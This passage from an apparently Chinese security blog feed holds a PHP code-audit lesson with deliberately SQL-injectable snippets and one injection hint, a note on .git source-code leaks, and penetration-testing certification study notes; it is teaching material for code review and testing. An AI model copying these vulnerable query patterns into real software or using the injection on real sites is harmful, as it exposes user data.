class="number">404</span><span class="string">");//虽然有404，但是不影响下面的查询语句执行</span></span><br><span class="line"><span class="string">    }</span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details where id ={<span class="variable">$_GET</span>[<span class="string">'id'</span>]};<span class="string">";//未把过滤后的内容传给查询语句</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure><p>（9）不存在SQL注入，添加了exit，就不存在漏洞了</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common.php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string">if(!is_numeric(<span class="subst">$_GET</span>['id'])){</span></span><br><span class="line"><span class="string">    header("</span><span class="number">404</span><span class="string">");</span></span><br><span class="line"><span class="string">        exit;//添加了exit，就不存在漏洞了</span></span><br><span class="line"><span class="string">    }</span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details where id ={<span class="variable">$_GET</span>[<span class="string">'id'</span>]};<span class="string">";//未把过滤后的内容传给查询语句</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure><p>（10）存在SQL注入漏洞</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common.php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string"><span class="subst">$order</span> = addslashes(<span class="subst">$_GET</span>['order']);</span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details ORDER BY id = {<span class="variable">$order</span>};<span class="string">";//此处为数字型，addslashes未起到作用</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure><p>（11）存在SQL注入，只判断了有正则，而没有严格限制</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">preg_match:执行匹配正则表达式</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common.php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string"><span class="subst">$order</span> = addslashes(<span class="subst">$_GET</span>['order']);</span></span><br><span class="line"><span class="string">    if (!preg_match('/DESC|ASC/i',<span class="subst">$order</span>)){//如果不是desc等就退出执行，但此处只要求包含DESC等，而不是强制要求必须是，  </span></span><br><span class="line"><span class="string">    注入思路: union select 1,2,3 # DESC</span></span><br><span class="line"><span class="string">    修改思路: /^(DESC|ASC)$/i从首到尾只能有</span></span><br><span class="line"><span class="string">    exit("</span>Bad order!<span class="string">");</span></span><br><span class="line"><span class="string">    }</span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details ORDER BY id = {<span class="variable">$order</span>};<span class="string">";//此处为数字型，addslashes未起到作用</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure><p>（12）不存在SQL注入漏洞，标准的预编译</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common.php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string"><span class="subst">$name</span> = <span class="subst">$_GET</span>['name'];</span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details where name = ?;<span class="string">";</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindValue(1,<span class="subst">$name</span>);//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure><p>（13）存在SQL注入，urldecode</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./common.php';</span></span><br><span class="line"><span class="string">try{</span></span><br><span class="line"><span class="string"><span class="subst">$name</span> = addslashes(<span class="subst">$_GET</span>['name']);</span></span><br><span class="line"><span class="string">    <span class="subst">$name</span> = urldecode(<span class="subst">$name</span>);//可以通过url编码引入单引号</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"><span class="subst">$query</span> = "</span>SELECT name, age, email, country FROM user_details where name = <span class="string">'{$name}'</span>;<span class="string">";</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span> = <span class="subst">$conn</span>-&gt;prepare(<span class="subst">$query</span>);</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;execute();</span></span><br><span class="line"><span class="string"><span class="subst">$stmt</span>-&gt;bindColumn("</span>ema1l<span class="string">', $email);</span></span><br><span class="line"><span class="string">while($row= $stmt-&gt;fetch(PDO::FETCH_BOUND)){</span></span><br><span class="line"><span class="string">echo "$email"."&lt;br&gt;";</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string">}catch(PDOException $e){</span></span><br><span class="line"><span class="string">echo $e-&gt;getMessage();</span></span><br><span class="line"><span class="string">}</span></span><br></pre></td></tr></tbody></table></figure><h2 id="任意文件操作"><a href="#任意文件操作" class="headerlink" title="任意文件操作"></a>任意文件操作</h2><h3 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h3><ul><li>文件包含<ul><li>include / require / include_once / require_once / spl_autoload</li></ul></li><li>文件读取<ul><li>file_get contents / fread / readfile / file / highlight_file / show_source</li></ul></li><li>文件写入<ul><li>file_put_contents / fwrite / mkdir / fputs</li></ul></li><li>文件删除<br>  unlink / rmdir</li><li>文件上传<br>  move_uploaded_file / copy / rename</li></ul><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><ul><li>文件上传流程<ol><li>检查文件大小、后缀、类型</li><li>检查文件内容(如图片头等)</li><li>提取文件后缀</li><li>生成新文件名</li><li>将上传临时文件拷贝到新文件名位置</li></ol></li><li>文件上传逻辑常见错误<ul><li>只检查文件类型不检查文件后缀</li><li>文件后缀黑名单导致遗漏</li><li>使用原始文件名，导致\0截断等漏洞</li></ul></li></ul><p>[^1]:mysqli (MySQL Improved) 是一个用于访问 MySQL 数据库的 PHP 扩展。它是 PHP 默认的数据库访问接口,取代了较早的 mysql 扩展。与 mysql 相比,mysqli 提供了更多的功能和特性,包括:支持预处理语句和存储过程,提高了数据库访问的安全性和性能。支持事务处理和多语句查询。提供了面向对象的接口,使代码更加清晰和易维护。支持异步查询,可以并发执行多个查询。提供了更丰富的错误处理和调试功能。<br>[^2]:PDO (PHP Data Objects) 是 PHP 中的一个数据库抽象层,它提供了一种统一的接口来访问不同种类的数据库,包括 MySQL、PostgreSQL、Oracle 等。<br>[^3]:通过使用指定的进制 base 转换（默认是十进制），返回变量 value的int数值。 <strong>intval()</strong> 不能用于 object，否则会产生 <strong><code>E_WARNING</code></strong> 错误并返回 1<br>[^4]:使用反斜线引用字符串，返回需要在转义字符之前添加反斜线的字符串</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WEB源码泄露漏洞</title>
      <link href="/2024/10/14/web-yuan-ma-xie-lu-lou-dong/"/>
      <url>/2024/10/14/web-yuan-ma-xie-lu-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB源码泄露漏洞"><a href="#WEB源码泄露漏洞" class="headerlink" title="WEB源码泄露漏洞"></a>WEB源码泄露漏洞</h1><h2 id="常见的web源码泄露"><a href="#常见的web源码泄露" class="headerlink" title="常见的web源码泄露"></a>常见的web源码泄露</h2><ul><li>git源码泄露</li><li>svn源码泄露</li><li>DS_Store 文件泄露</li><li>网站备份压缩文件泄露</li><li>WEB-INF/web.xml 泄露</li><li>CVS泄露</li><li>hg源码泄漏</li><li>Bazaar/bzr泄露</li><li>SWP 文件泄露</li><li>env泄露</li></ul><h2 id="1-git-源码泄露"><a href="#1-git-源码泄露" class="headerlink" title="1.git 源码泄露"></a>1.git 源码泄露</h2><p>​Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下<strong>自动创建一个.git目录</strong>，用来记录代码的变更记录等。</p><p>​发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码</p><p>​.git目录结构如下:</p><p><img src="https://pic.imgdb.cn/item/670c7efcd29ded1a8c94dee9.png"></p><ul><li><strong>HEAD：</strong> 这个git项目当前处在哪个分支里；</li><li><strong>config：</strong> 文件包含项目特有的配置选项，git config命令会改动它；</li><li><strong>description：</strong> 项目的描述信息</li><li><strong>hooks/：</strong> 系统默认钩子脚本目录</li><li><strong>info/：</strong> 目录包含一个全局性排除（global exclude）文件，用以放置不希望被记录在 .gitignore 文件中的忽略模式（ignored patterns）</li><li><strong>objects/：</strong> 目录存储所有数据内容 (commits, trees, blobs, tags)</li><li><strong>refs/：</strong> 标识你项目里的每个分支指向了哪个提交(commit)。</li><li><strong>index:</strong> 文件保存暂存区信息</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>深信服安全服务认证工程师学习笔记</title>
      <link href="/2024/09/30/shen-xin-fu-an-quan-fu-wu-ren-zheng-gong-cheng-shi-xue-xi-bi-ji/"/>
      <url>/2024/09/30/shen-xin-fu-an-quan-fu-wu-ren-zheng-gong-cheng-shi-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="深信服安全服务认证工程师学习笔记"><a href="#深信服安全服务认证工程师学习笔记" class="headerlink" title="深信服安全服务认证工程师学习笔记"></a>深信服安全服务认证工程师学习笔记</h1><h2 id="第一章-网络安全基础"><a href="#第一章-网络安全基础" class="headerlink" title="第一章 网络安全基础"></a>第一章 网络安全基础</h2><h3 id="第一部分-网络安全基础"><a href="#第一部分-网络安全基础" class="headerlink" title="第一部分 网络安全基础"></a>第一部分 网络安全基础</h3><h3 id="第二部分-操作系统配置与应用"><a href="#第二部分-操作系统配置与应用" class="headerlink" title="第二部分 操作系统配置与应用"></a>第二部分 操作系统配置与应用</h3><h3 id="第三部分-计算机网络原理与应用"><a href="#第三部分-计算机网络原理与应用" class="headerlink" title="第三部分 计算机网络原理与应用"></a>第三部分 计算机网络原理与应用</h3><h2 id="第二章-网络渗透测试基础"><a href="#第二章-网络渗透测试基础" class="headerlink" title="第二章 网络渗透测试基础"></a>第二章 网络渗透测试基础</h2><h3 id="第一部分-渗透测试概述"><a href="#第一部分-渗透测试概述" class="headerlink" title="第一部分 渗透测试概述"></a>第一部分 渗透测试概述</h3><h4 id="2-1-1-渗透测试标准与流程"><a href="#2-1-1-渗透测试标准与流程" class="headerlink" title="2.1.1 渗透测试标准与流程"></a>2.1.1 渗透测试标准与流程</h4><h5 id="渗透测试概述"><a href="#渗透测试概述" class="headerlink" title="渗透测试概述"></a>渗透测试概述</h5><ol><li>渗透测试</li></ol><p>​渗透测试(Penetration Testing)是一种通过<strong>模拟攻击</strong>的技术与方法，挫败目标系统的安全控制措施并获得控制访问权的<strong>安全测试</strong>方法。</p><p>​网络渗透测试主要依据CVE(Common Vulnerabilities and Exposures)已经发现的安全漏洞，模拟入侵者的攻击方法对网站应用、服务器系统和网络设备进行<strong>非破坏性质</strong>的攻击性测试。</p><ul><li>CVE：Common Vulnerabilities and Exposures，通用漏洞与披露<ul><li><a href="http://cve.mitre.org/">http://cve.mitre.org</a></li></ul></li><li>CWE：Common Weakness Enumeration，通用缺陷列表<ul><li><a href="http://cwe.mitre.org/data/definitions/79.html%EF%BC%8C">http://cwe.mitre.org/data/definitions/79.html，</a> XSS类漏洞<ul><li><a href="http://cwe.mitre.org/data/definitions/89.html%EF%BC%8C">http://cwe.mitre.org/data/definitions/89.html，</a> SQL注入类漏洞</li></ul></li></ul></li></ul><ol start="2"><li>渗透测试的必要性</li></ol><p>（1）为什么要进行渗透测试?</p><ul><li><p>百密一疏，新系统可能存在知的安全风险</p></li><li><p>未雨绸缪，而不是亡羊补牢</p></li><li><p>专业的渗透测试后，即使系统未被攻破，也可以以此证明先前实行的防御是有效的</p></li><li><p>专业的渗透测试可以有效评估系统的安全状况，并提出合理的改进方案</p></li></ul><p>（2）目的</p><ul><li>侵入系统获取机密信息，并将入侵的过程和细节产生报告提供给用户，由此确定用户系统存在的安全威胁，并能提醒安全管理员完善安全策略，降低安全风险</li></ul><ol start="3"><li>渗透测试的原则</li></ol><p>渗透测试过程的最大风险：测试过程中对业务产生影响</p><ul><li>渗透测试是一个渐进的并且逐步深入的过程</li><li>渗透测试是选择不影响业务系统正常运行的攻击方法进行的测试</li></ul><p>合规性：<strong>符合规范和法律要求</strong>也是执行渗透测试业务的一个必要条件(渗透测试必须使用一些通过规范审核后的工具)</p><ol start="4"><li>渗透测试与APT</li></ol><p>（1）目的</p><ul><li>渗透测试的目的是评估计算机网络系统的安全性</li><li>APT的目的是对高价值目标进行有组织、长期持续性的控制</li></ul><p>（2）手段方法</p><ul><li>渗透测试通过被允许的行为模拟黑客攻击来对目标系统进行测试</li><li>APT利用任何各种高技术手段(包括0day漏洞、“水坑”攻击、“鱼叉”攻击等)进行攻击</li></ul><p>（3）结果</p><ul><li><p>渗透测试提高了目标系统的安全级别</p></li><li><p>APT在达成目的的过程中一般会给目标系统带来严重损失</p></li></ul><h5 id="渗透测试分类"><a href="#渗透测试分类" class="headerlink" title="渗透测试分类"></a>渗透测试分类</h5><ol><li>根据渗透测试方法分类</li></ol><ul><li>黑盒测试：将测试对象看作一个黑盒子，完全不考虑测试对象的内部结构和内部特性。</li><li>白盒测试：把测试对象看作一个打开的盒子，测试人员依据测试对象内部逻辑结构相关信息，设计或选择测试用例。</li><li>灰盒测试：介于白盒与黑盒之间，是基于对测试对象内部细节有限认知的软件测试方法。</li></ul><ol start="2"><li>根据渗透测试目标分类</li></ol><ul><li>主机操作系统渗透：对Windows、Solaris、AIX、Linux、SCO、SGl等操作系统本身进行渗透测试。</li><li>数据库系统渗透：对MS-SQL、Oracle、MySQL、Informix、Sybase、DB2、Access等数据库应用系统进行渗透测试。</li><li>应用系统渗透：对渗透目标提供的各种应用，如ASP、CG1、JSP、PHP等组成的WWW应用进行渗透测试。</li><li>网络设备渗透：对各种防火墙、入侵检测系统、路由器、交换机等网络设备进行渗透测试。</li></ul><ol start="3"><li>根据渗透测试的位置分类</li></ol><ul><li>内网渗透：模拟客户内部违规操作者的行为，在内网中对目标进行渗透测试</li><li>外网渗透：模拟对内部状态一无所知的外部攻击者的行为(包括对网络设备的远程攻击、口令管理安全性测试、防火墙规则试探与规避、Web及其他开放应用服务的安全性测试等)，从外网对目标进行渗透测试</li></ul><ol start="4"><li>针对Web服务体系架构的渗透测试</li></ol><ul><li>服务器渗透测试：对服务器自身的安全性(如操作系统、数据库是否存在弱口令等)进行检测。</li><li>中间件渗透测试：对Apache、lS、Tomcat、Nginx等Web中间件的漏洞(如配置缺陷、文件解析、反序列化漏洞等)进行检测。</li><li>Web应用渗透测试：对CMS、Blog等Web应用程序的洞(如SQL注入、XSS、CSRF、文件上传与解析、文件包含、命令执行等)进行检测。</li><li>业务逻辑渗透测试：对业务逻辑安全性(如验证逻辑问题、会话管理问题、权限控制问题等)进行检测。</li></ul><h5 id="渗透测试标准与执行流程"><a href="#渗透测试标准与执行流程" class="headerlink" title="渗透测试标准与执行流程"></a>渗透测试标准与执行流程</h5><ol><li>渗透测试标准</li></ol><ul><li>安全测试方法学开源手册(OSSTMM)</li><li>网络安全测试指南(NIST SP 800-42)</li><li>OWASP 十大Web应用安全威胁项目(OWASP TOP 10)</li><li>Web应用安全威胁分类标准(WASC-TC)</li><li><strong>渗透测试执行标准(PTES)</strong></li></ul><ol start="2"><li>《渗透测试执行标准》</li></ol><p>​《渗透测试执行标准》(PTES:Penetration Testing Execution Standard)的核心理念是通过建立起进行渗透测试所要求的基本准则基线，来定义一次真正的渗透测试过程，并得到安全业界的广泛认同。</p><p>​PTES将渗透测试过程分为七个阶段，并在每个阶段中定义不同的扩展级别，而选择哪种级别则由被测试的客户组织决定。</p><p><img src="https://pic.imgdb.cn/item/67403caad29ded1a8cc70249.png"></p><p>（1）第一阶段–前期交互阶段</p><ul><li>在前期交互(Pre-Engagement Interaction)阶段，渗透测试团队与客户组织进行交互讨论，最重要的是**<u>确定渗透测试的范围、目标、限制条件以及服务合同细节</u>**</li><li>该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。</li><li>客户**<u>书面授权委托</u><strong>，并同意实施方案是进行渗透测试的</strong>必要条件<strong>。渗透测试首先必须将实施方法、实施时间、实施人员、实施工具等具体的实施方案提交给客户，并得到客户的相应书面委托和授权。应该做到客户对渗透测试所有细节和风险的知晓，</strong>所有过程都在客户的控制下进行**。</li></ul><p><img src="https://pic.imgdb.cn/item/6740404ed29ded1a8cc9ac29.png"></p><p>（2）第二阶段–信息收集阶段</p><ul><li>信息收集是每一步渗透攻击的前提，通过信息收集可以有针对性地制定模拟攻击测试计划，提高模拟攻击的成功率，同时可以有效地降低攻击测试对系统正常运行造成的不利影响，</li><li>信息收集的方法包括DNS探测、操作系统指纹判别、应用判别、账号扫描、配置判别等。信息收集常用的工具:<ul><li>商业网络安全漏洞扫描软件Nessus、开源安全检测工具Nmap等</li><li>操作系统内置的许多功能(Telnet、Nslookup、IE等)也可以作为信息收集的有<br>  效工具。</li></ul></li></ul><p><img src="https://pic.imgdb.cn/item/67404115d29ded1a8cca52a0.png"></p><p>（3）第三阶段–威胁建模阶段</p><ul><li>威胁建模主要使用在信息收集分析阶段所获取到的信息，来标识出目标系统上可能存在的安全漏洞与弱点。</li><li>在进行威胁建模时，将确定最为高效的攻击方法、所需要进一步获取到的信息以及从哪里攻破目标系统。</li><li>在威胁建模阶段，通常需要将客户组织作为敌手看待，然后以<strong>攻击者的视角</strong>和思维来尝试利用目标系统的弱点。</li></ul><p><img src="https://pic.imgdb.cn/item/6740418bd29ded1a8ccab49b.png"></p><p>（4）第四阶段–漏洞分析阶段</p><ul><li>漏洞分析阶段主要是从前面几个环节获取的信息中分析和理解哪些攻击途径会是可行的。</li><li>特别需要重点分析端口和漏洞扫描结果、取到的服务“旗帜”信息以及在信息收集分析环节中得到的其他关键信息。</li></ul><p><img src="https://pic.imgdb.cn/item/6740422ad29ded1a8ccb30ac.png"></p><p>（5）第五阶段–渗透测试阶段</p><ul><li>渗透攻击主要是针对目标系统实施深入研究和测试的渗透攻击，并不是进行大量漫无目的的渗透测试。主要包括:<ul><li>精准打击</li><li>绕过防御机制</li><li>定制渗透攻击路径</li><li>绕过检测机制</li><li>触发攻击响应控制措施</li><li>渗透代码测试</li></ul></li></ul><p><img src="https://pic.imgdb.cn/item/674042a8d29ded1a8ccb93f5.png"></p><p>（6）第六阶段–后渗透测试阶段</p><ul><li>后渗透攻击阶段从已经攻陷了客户组织的一些系统或取得域管理员权限之后开始，将以特定业务系统为目标，标识出关键的基础设施，并寻找客户组织最具价值和尝试进行安全保护的信息和资产，并需要演示出能够对客户组织造成最重要业务影响的攻击途径。主要包括<ul><li>基础设施分析</li><li>高价值目标识别</li><li>掠夺敏感信息</li><li>业务影响攻击</li><li>掩踪灭迹</li><li>持续性存在</li></ul></li></ul><p><img src="https://pic.imgdb.cn/item/6740432fd29ded1a8ccc0f6b.png"></p><p>（7）第七阶段–报告阶段</p><ul><li>报告是渗透测试过程中最为重要的因素，将使用报告文档来交流在渗透测试过程中做了哪些、如何做的，以及最为重要的一<strong>客户组织如何修复你所发现的安全漏洞与弱点</strong></li></ul><ol start="3"><li>注意事项</li></ol><ul><li>在前期交互阶段，必须<strong>取得客户的授权</strong></li><li>取得客户的授权后，必须向<strong>公安部门等监管机构进行报备</strong></li><li>保证渗透测试过程中所用的工具都是合规的、经过检验的</li></ul><h4 id="2-1-2-渗透测试报告"><a href="#2-1-2-渗透测试报告" class="headerlink" title="2.1.2 渗透测试报告"></a>2.1.2 渗透测试报告</h4><h5 id="渗透测试报告的重要性"><a href="#渗透测试报告的重要性" class="headerlink" title="渗透测试报告的重要性"></a>渗透测试报告的重要性</h5><ol><li>编写渗透测试报告的两大宗旨和难题</li></ol><ul><li>如何准确定位问题?</li><li>如何让甲方意识到问题的严重性?</li></ul><ol start="2"><li>渗透测试必须包含</li></ol><ul><li>该漏洞对企业资产的影响状况(可能造成的问题)</li><li>合理的漏洞分级标准及相应漏洞的分级</li><li>系统整体加固建议(如漏洞修复建议、安全防护措施等)</li></ul><ol start="3"><li>渗透测试报告给谁看</li></ol><ul><li>高级管理人员:不关心技术细节，只关心结果(安全不安全)</li><li>IT管理人员:对该组织的整体安全性感兴趣，同时也希望确保其特定的部门在测试过程中都没有发现任何重大问题。</li><li>IT技术人员:负责修复测试过程中发现的问题的人。他们想知道三件事:受影响系统的名称、该漏洞的严重程度以及如何解决它</li></ul><ol start="4"><li>渗透测试报告的重要性</li></ol><ul><li>判定测试费用的重要依据</li><li>判定渗透测试团队优劣的重要依据</li><li>判定测试是否成功的重要依据</li></ul><h5 id="正确编写渗透测试报告"><a href="#正确编写渗透测试报告" class="headerlink" title="正确编写渗透测试报告"></a>正确编写渗透测试报告</h5><ol><li>必须具备的品质</li></ol><ul><li>简单明了，直击要害<ul><li>关键部分干练的语言是报告的精髓所在</li><li>让客户明白问题在哪里，而不是去报告中找问题</li><li>说明可能造成的危害，体现渗透测试的价值</li></ul></li><li>尽可能通俗易懂<ul><li>能让客户准确定位并修补漏洞</li><li>给出漏洞利用手段或exp</li><li>给出漏洞修补建议</li></ul></li><li>满足甲方需求<ul><li>指引需求—些甲方可能在测试前不知道他们想要什么样的结果</li><li>甲方需求明确时，严格按照甲方的要求进行测试</li></ul></li></ul><ol start="2"><li>报告基本组成要素</li></ol><ul><li>封面</li><li>内容提要</li><li>漏洞概览及目录</li><li>使用的工具列表</li><li>报告主体</li></ul><ol start="3"><li>报告的基本要素–封面</li></ol><ul><li>公司名称、标志</li><li>测试的范畴(如:内网测试)</li><li>测试时间</li><li>文档的保密级别(保密声明)</li><li>法律声明</li></ul><ol start="4"><li>报告的基本要素–内容提要</li></ol><ul><li>尽量限制字数</li><li>明确指出客户所要求测试的系统是否安全</li><li>尽量不提及使用的工具、技术</li><li>让客户明白我们做了什么，接下来要做什么</li><li>最后一行应该是一个结论，即明确指出是该系统是安全还是不安全<ul><li>一个糟糕的总结：“总之，我们发现一些地方的安全策略运作良好，但有些地方并未遵从。这导致了一定风险，但并不是致命风险。“</li><li>一个优秀的总结：“总之，我们发现了某些地方没有遵守安全策略，这给组织带来了一定风险，因此我们必须声明该系统是不安全的。</li></ul></li></ul><ol start="5"><li>报告的基本要素–漏洞概览及目录</li></ol><ul><li>一目了然(可以使用表格或图标等)</li><li>分类列举漏洞</li><li>可以包含漏洞的严重性</li></ul><img src="https://pic.imgdb.cn/item/674081ccd29ded1a8c034e22.png" style="zoom:67%;"><ol start="6"><li>报告的基本要素–使用的工具列表</li></ol><ul><li>列出所使用的工具</li><li>可以包含简要的工具说明</li></ul><ol start="7"><li>报告的基本要素–报告主体</li></ol><ul><li>发现的每一个漏洞</li><li>发现漏洞使用的工具、payload、exp、影响范围和存在的隐患或危害等内容（切忌复制粘贴扫描器结果!)</li><li>漏洞修复建议</li></ul><p><u><strong>注意：加密传输报告</strong></u></p><ol start="8"><li>报告模板</li></ol><p><img src="https://pic.imgdb.cn/item/674083a5d29ded1a8c04e6d1.png"></p><p><img src="https://pic.imgdb.cn/item/674083c2d29ded1a8c04ff35.png"></p><p><img src="https://pic.imgdb.cn/item/674083dfd29ded1a8c051b4f.png"></p><p><img src="https://pic.imgdb.cn/item/674083f4d29ded1a8c052c9c.png"></p><h3 id="第二部分-渗透测试环境搭建与工具使用"><a href="#第二部分-渗透测试环境搭建与工具使用" class="headerlink" title="第二部分 渗透测试环境搭建与工具使用"></a>第二部分 渗透测试环境搭建与工具使用</h3><h2 id="第三章-信息收集"><a href="#第三章-信息收集" class="headerlink" title="第三章 信息收集"></a>第三章 信息收集</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="3-1-信息收集总览"><a href="#3-1-信息收集总览" class="headerlink" title="3.1 信息收集总览"></a>3.1 信息收集总览</h4><h5 id="信息收集的种类"><a href="#信息收集的种类" class="headerlink" title="信息收集的种类"></a>信息收集的种类</h5><h6 id="DNS"><a 